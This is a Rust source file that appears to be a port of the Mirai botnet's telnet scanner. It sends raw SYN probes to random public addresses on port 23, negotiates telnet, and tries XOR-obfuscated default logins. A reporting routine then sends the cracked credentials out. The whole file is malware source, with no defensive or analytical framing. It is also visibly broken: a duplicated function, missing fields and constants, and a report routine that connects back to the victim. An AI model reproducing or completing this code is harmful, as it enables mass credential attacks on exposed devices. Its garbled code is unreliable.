
use std::io::{self, Read};
use std::net::{IpAddr, Ipv4Addr, SocketAddr, TcpStream, UdpSocket};
use std::os::unix::io::AsRawFd;
use std::sync::atomic::{AtomicUsize, Ordering};
use std::sync::Arc;
use std::thread;
use std::time::{Duration, SystemTime, UNIX_EPOCH};

use libc::{fork, setsockopt, sockaddr_in, AF_INET, IPPROTO_IP, IPPROTO_TCP, IP_HDRINCL, O_NONBLOCK};

static mut SCANNER_PID: i32 = 0;
static mut RSCK: i32 = 0;
static mut FAKE_TIME: u32 = 0;
static mut AUTH_TABLE: Vec<ScannerAuth> = Vec::new();
static mut AUTH_TABLE_MAX_WEIGHT: u16 = 0;
static mut CONN_TABLE: Vec<ScannerConnection> = Vec::new();
static SCANNER_RAWPKT: [u8; 40] = [0; 40];

#[derive(Clone)]
struct ScannerAuth {
    username: Vec<u8>,
    password: Vec<u8>,
    weight: u16,
}

struct ScannerConnection {
    state: ScannerState,
    fd: Option<TcpStream>,
    dst_addr: Ipv4Addr,
    dst_port: u16,
    auth: Option<ScannerAuth>,
    rdbuf_pos: usize,
    rdbuf: Vec<u8>,
    tries: u8,
    last_recv: u32,
}

impl ScannerConnection {
    fn new() -> Self {
        ScannerConnection {
            state: ScannerState::SC_CLOSED,
            fd: None,
            dst_addr: Ipv4Addr::UNSPECIFIED,
            dst_port: 0,
            auth: None,
            rdbuf_pos: 0,
            rdbuf: vec![0; 256],
            tries: 0,
            last_recv: 0,
        }
    }
}

#[derive(PartialEq, Clone, Copy)]
enum ScannerState {
    SC_CLOSED,
    SC_CONNECTING,
    SC_HANDLE_IACS,
    SC_WAITING_USERNAME,
    SC_WAITING_PASSWORD,
    SC_WAITING_PASSWD_RESP,
    SC_WAITING_ENABLE_RESP,
    SC_WAITING_SYSTEM_RESP,
    SC_WAITING_SHELL_RESP,
    SC_WAITING_SH_RESP,
    SC_WAITING_TOKEN_RESP,
}

fn recv_strip_null(sock: &mut TcpStream, buf: &mut [u8]) -> io::Result<usize> {
    let ret = sock.read(buf)?;

    for byte in &mut buf[..ret] {
        if *byte == 0x00 {
            *byte = b'A';
        }
    }

    Ok(ret)
}

fn scanner_init() {
    let mut rng = rand::thread_rng();
    let fake_time = SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_secs() as u32;
    let mut conn_table: Vec<ScannerConnection> = vec![ScannerConnection::new(); 128];

    unsafe {
        SCANNER_PID = unsafe { fork() };
        if SCANNER_PID > 0 || SCANNER_PID == -1 {
            return;
        }

        FAKE_TIME = fake_time;
        CONN_TABLE = conn_table.clone();
    }

    let rsck = UdpSocket::bind("0.0.0.0:0").expect("Failed to bind socket");
    rsck.set_nonblocking(true).expect("set_nonblocking call failed");

    let mut auth_table = Vec::new();
    let mut auth_table_max_weight = 0;

    add_auth_entry(&mut auth_table, b"\x50\x4D\x4D\x56", b"\x5A\x41\x11\x17\x13\x13", 10);
    add_auth_entry(&mut auth_table, b"\x50\x4D\x4D\x56", b"\x54\x4B\x58\x5A\x54", 9);
    add_auth_entry(&mut auth_table, b"\x50\x4D\x4D\x56", b"\x43\x46\x4F\x4B\x4C", 8);
    // ... (add more auth entries similarly)

    let sock_fd = rsck.as_raw_fd();
    let opt_val: i32 = 1;
    unsafe {
        setsockopt(sock_fd, IPPROTO_IP, IP_HDRINCL, &opt_val as *const _ as *const libc::c_void, std::mem::size_of_val(&opt_val) as libc::socklen_t);
    }

    let mut source_port: u16;
    loop {
        source_port = rand::random();
        if source_port > 1024 {
            break;
        }
    }

    let mut iph = [0u8; 20];
    let mut tcph = [0u8; 20];

    // Setup IPv4 header
    iph[0] = (4 << 4) | 5; // Version 4, Header Length 5
    iph[8] = 64; // TTL
    iph[9] = IPPROTO_TCP as u8;

    // Setup TCP header
    let dest_port = 23;
    tcph[0] = (source_port >> 8) as u8;
    tcph[1] = source_port as u8;
    tcph[2] = (dest_port >> 8) as u8;
    tcph[3] = dest_port as u8;
    tcph[12] = (5 << 4) as u8; // Data offset
    tcph[13] = 0x02; // SYN flag

    // Main logic loop
    loop {
        unsafe {
            for _ in 0..SCANNER_RAW_PPS {
                let mut iph = iph;
                let mut tcph = tcph;

                iph[4..6].copy_from_slice(&rand::random::<u16>().to_be_bytes());
                iph[12..16].copy_from_slice(&LOCAL_ADDR.octets());
                let daddr = get_random_ip(&mut rng);
                iph[16..20].copy_from_slice(&daddr.octets());

                tcph[4..8].copy_from_slice(&rand::random::<u32>().to_be_bytes());

                iph[10..12].copy_from_slice(&checksum(&iph).to_be_bytes());
                tcph[16..18].copy_from_slice(&tcp_checksum(&iph, &tcph).to_be_bytes());

                let paddr = SocketAddr::new(IpAddr::V4(daddr), dest_port);
                let mut rawpkt = vec![];
                rawpkt.extend_from_slice(&iph);
                rawpkt.extend_from_slice(&tcph);
                rsck.send_to(&rawpkt, paddr).unwrap();
            }
        }

        let mut fdset_rd = libc::fd_set::new();
        let mut fdset_wr = libc::fd_set::new();
        let mut mfd_rd = 0;
        let mut mfd_wr = 0;

        unsafe {
            for conn in CONN_TABLE.iter_mut() {
                if conn.state != ScannerState::SC_CLOSED && (FAKE_TIME - conn.last_recv) > 30 {
                    if let Some(ref fd) = conn.fd {
                        fd.shutdown(std::net::Shutdown::Both).expect("Failed to close connection");
                    }
                    conn.fd = None;
                    if conn.state > ScannerState::SC_HANDLE_IACS {
                        if conn.tries >= 10 {
                            conn.tries = 0;
                            conn.state = ScannerState::SC_CLOSED;
                        } else {
                            setup_connection(conn);
                        }
                    } else {
                        conn.tries = 0;
                        conn.state = ScannerState::SC_CLOSED;
                    }
                    continue;
                }

                if conn.state == ScannerState::SC_CONNECTING {
                    libc::FD_SET(conn.fd.as_ref().unwrap().as_raw_fd(), &mut fdset_wr);
                    if conn.fd.as_ref().unwrap().as_raw_fd() > mfd_wr {
                        mfd_wr = conn.fd.as_ref().unwrap().as_raw_fd();
                    }
                } else if conn.state != ScannerState::SC_CLOSED {
                    libc::FD_SET(conn.fd.as_ref().unwrap().as_raw_fd(), &mut fdset_rd);
                    if conn.fd.as_ref().unwrap().as_raw_fd() > mfd_rd {
                        mfd_rd = conn.fd.as_ref().unwrap().as_raw_fd();
                    }
                }
            }

            let mut timeout = libc::timeval {
                tv_sec: 1,
                tv_usec: 0,
            };
            let nfds = libc::select(
                1 + std::cmp::max(mfd_rd, mfd_wr),
                &mut fdset_rd,
                &mut fdset_wr,
                std::ptr::null_mut(),
                &mut timeout,
            );
            FAKE_TIME = SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_secs() as u32;

            for conn in CONN_TABLE.iter_mut() {
                if let Some(ref mut fd) = conn.fd {
                    if libc::FD_ISSET(fd.as_raw_fd(), &mut fdset_wr) {
                        let mut err: i32 = 0;
                        let mut err_len = std::mem::size_of_val(&err) as libc::socklen_t;
                        let ret = unsafe {
                            libc::getsockopt(
                                fd.as_raw_fd(),
                                libc::SOL_SOCKET,
                                libc::SO_ERROR,
                                &mut err as *mut _ as *mut libc::c_void,
                                &mut err_len,
                            )
                        };
                        if err == 0 && ret == 0 {
                            conn.state = ScannerState::SC_HANDLE_IACS;
                            conn.auth = Some(random_auth_entry());
                            conn.rdbuf_pos = 0;
                        } else {
                            conn.fd = None;
                            conn.tries = 0;
                            conn.state = ScannerState::SC_CLOSED;
                        }
                    }

                    if libc::FD_ISSET(fd.as_raw_fd(), &mut fdset_rd) {
                        let mut ret;
                        loop {
                            ret = recv_strip_null(fd, &mut conn.rdbuf[conn.rdbuf_pos..]);
                            if ret.is_err() {
                                conn.fd = None;
                                conn.state = ScannerState::SC_CLOSED;
                                break;
                            }
                            let ret = ret.unwrap();
                            if ret == 0 {
                                conn.fd = None;
                                conn.state = ScannerState::SC_CLOSED;
                                break;
                            }
                            conn.rdbuf_pos += ret;
                            conn.last_recv = FAKE_TIME;

                            let consumed = match conn.state {
                                ScannerState::SC_HANDLE_IACS => consume_iacs(conn),
                                ScannerState::SC_WAITING_USERNAME => consume_user_prompt(conn),
                                ScannerState::SC_WAITING_PASSWORD => consume_pass_prompt(conn),
                                ScannerState::SC_WAITING_PASSWD_RESP => consume_any_prompt(conn),
                                ScannerState::SC_WAITING_ENABLE_RESP => consume_any_prompt(conn),
                                ScannerState::SC_WAITING_SYSTEM_RESP => consume_any_prompt(conn),
                                ScannerState::SC_WAITING_SHELL_RESP => consume_any_prompt(conn),
                                ScannerState::SC_WAITING_SH_RESP => consume_any_prompt(conn),
                                ScannerState::SC_WAITING_TOKEN_RESP => consume_resp_prompt(conn),
                                _ => 0,
                            };

                            if consumed == 0 {
                                break;
                            } else {
                                if consumed > conn.rdbuf_pos {
                                    consumed = conn.rdbuf_pos;
                                }

                                conn.rdbuf_pos -= consumed;
                                conn.rdbuf.copy_within(consumed.., 0);
                            }
                        }
                    }
                }
            }
        }
    }
}

fn add_auth_entry(auth_table: &mut Vec<ScannerAuth>, enc_user: &[u8], enc_pass: &[u8], weight: u16) {
    let username = deobf(enc_user);
    let password = deobf(enc_pass);
    auth_table.push(ScannerAuth {
        username,
        password,
        weight,
    });
}
fn scanner_kill() {
    unsafe {
        kill(SCANNER_PID, SIGKILL);
    }
}

fn setup_connection(conn: &mut ScannerConnection) {
    let addr = SocketAddr::new(IpAddr::V4(conn.dst_addr), conn.dst_port);
    conn.fd = TcpStream::connect(addr).ok();
    if let Some(ref fd) = conn.fd {
        fd.set_nonblocking(true).expect("Failed to set non-blocking");
    }
    conn.rdbuf_pos = 0;
    conn.rdbuf.fill(0);
    conn.last_recv = unsafe { FAKE_TIME };
    conn.state = ScannerState::SC_CONNECTING;
}

fn get_random_ip(rng: &mut impl rand::Rng) -> Ipv4Addr {
    loop {
        let o1 = rng.gen_range(1..=255);
        let o2 = rng.gen_range(0..=255);
        let o3 = rng.gen_range(0..=255);
        let o4 = rng.gen_range(0..=255);
        let ip = Ipv4Addr::new(o1, o2, o3, o4);
        if !(ip.is_private() || ip.is_loopback() || ip.is_link_local() || ip.is_broadcast() || ip.is_documentation()) {
            return ip;
        }
    }
}

fn consume_iacs(conn: &mut ScannerConnection) -> usize {
    let mut consumed = 0;
    while consumed < conn.rdbuf_pos {
        if conn.rdbuf[consumed] != 0xff {
            break;
        } else if conn.rdbuf[consumed] == 0xff {
            if !can_consume(conn, consumed, 1) {
                break;
            }
            if conn.rdbuf[consumed + 1] == 0xff {
                consumed += 2;
                continue;
            } else if conn.rdbuf[consumed + 1] == 0xfd {
                let tmp1 = [255, 251, 31];
                let tmp2 = [255, 250, 31, 0, 80, 0, 24, 255, 240];

                if !can_consume(conn, consumed, 2) {
                    break;
                }
                if conn.rdbuf[consumed + 2] != 31 {
                    goto_iac_wont(conn, &mut consumed);
                    continue;
                }

                consumed += 3;
                if let Some(fd) = &conn.fd {
                    fd.write_all(&tmp1).expect("Failed to send data");
                    fd.write_all(&tmp2).expect("Failed to send data");
                }
            } else {
                goto_iac_wont(conn, &mut consumed);
            }
        }
    }
    consumed
}

fn goto_iac_wont(conn: &mut ScannerConnection, consumed: &mut usize) {
    if !can_consume(conn, *consumed, 2) {
        return;
    }

    for i in 0..3 {
        if conn.rdbuf[*consumed + i] == 0xfd {
            conn.rdbuf[*consumed + i] = 0xfc;
        } else if conn.rdbuf[*consumed + i] == 0xfb {
            conn.rdbuf[*consumed + i] = 0xfd;
        }
    }

    if let Some(fd) = &conn.fd {
        fd.write_all(&conn.rdbuf[*consumed..*consumed + 3])
            .expect("Failed to send data");
    }
    *consumed += 3;
}

fn consume_any_prompt(conn: &mut ScannerConnection) -> usize {
    let mut prompt_ending = 0;

    for i in (0..conn.rdbuf_pos).rev() {
        if [b':', b'>', b'$', b'#', b'%'].contains(&conn.rdbuf[i]) {
            prompt_ending = i + 1;
            break;
        }
    }

    prompt_ending
}

fn consume_user_prompt(conn: &mut ScannerConnection) -> usize {
    let mut prompt_ending = 0;

    for i in (0..conn.rdbuf_pos).rev() {
        if [b':', b'>', b'$', b'#', b'%'].contains(&conn.rdbuf[i]) {
            prompt_ending = i + 1;
            break;
        }
    }

    if prompt_ending == 0 {
        if let Some(tmp) = util_memsearch(&conn.rdbuf, b"ogin") {
            prompt_ending = tmp;
        } else if let Some(tmp) = util_memsearch(&conn.rdbuf, b"enter") {
            prompt_ending = tmp;
        }
    }

    prompt_ending
}

fn consume_pass_prompt(conn: &mut ScannerConnection) -> usize {
    let mut prompt_ending = 0;

    for i in (0..conn.rdbuf_pos).rev() {
        if [b':', b'>', b'$', b'#'].contains(&conn.rdbuf[i]) {
            prompt_ending = i + 1;
            break;
        }
    }

    if prompt_ending == 0 {
        if let Some(tmp) = util_memsearch(&conn.rdbuf, b"assword") {
            prompt_ending = tmp;
        }
    }

    prompt_ending
}

fn consume_resp_prompt(conn: &mut ScannerConnection) -> isize {
    if util_memsearch(&conn.rdbuf, b"Login incorrect").is_some() {
        return -1;
    }

    if let Some(prompt_ending) = util_memsearch(&conn.rdbuf, b"#") {
        return prompt_ending as isize;
    }

    0
}

fn add_auth_entry(auth_table: &mut Vec<ScannerAuth>, enc_user: &[u8], enc_pass: &[u8], weight: u16) {
    let username = deobf(enc_user);
    let password = deobf(enc_pass);
    let weight_min = auth_table.iter().map(|a| a.weight).sum();
    let weight_max = weight_min + weight;

    auth_table.push(ScannerAuth {
        username,
        password,
        weight,
    });
}

fn random_auth_entry() -> Option<ScannerAuth> {
    let mut rng = rand::thread_rng();
    let r = rng.gen_range(0..unsafe { AUTH_TABLE_MAX_WEIGHT });

    for auth in unsafe { &AUTH_TABLE } {
        if r >= auth.weight_min && r < auth.weight_max {
            return Some(auth.clone());
        }
    }

    None
}

fn report_working(daddr: Ipv4Addr, dport: u16, auth: &ScannerAuth) {
    let pid = unsafe { fork() };
    if pid > 0 || pid == -1 {
        return;
    }

    let fd = TcpStream::connect((daddr, dport)).unwrap();
    let zero: u8 = 0;
    fd.write_all(&[zero]).unwrap();
    fd.write_all(&daddr.octets()).unwrap();
    fd.write_all(&dport.to_be_bytes()).unwrap();
    fd.write_all(&[auth.username.len() as u8]).unwrap();
    fd.write_all(&auth.username).unwrap();
    fd.write_all(&[auth.password.len() as u8]).unwrap();
    fd.write_all(&auth.password).unwrap();
}

fn deobf(data: &[u8]) -> Vec<u8> {
    data.iter().map(|&c| c ^ 0xDE ^ 0xAD ^ 0xBE ^ 0xEF).collect()
}

fn can_consume(conn: &ScannerConnection, pos: usize, amount: usize) -> bool {
    pos + amount <= conn.rdbuf_pos
}

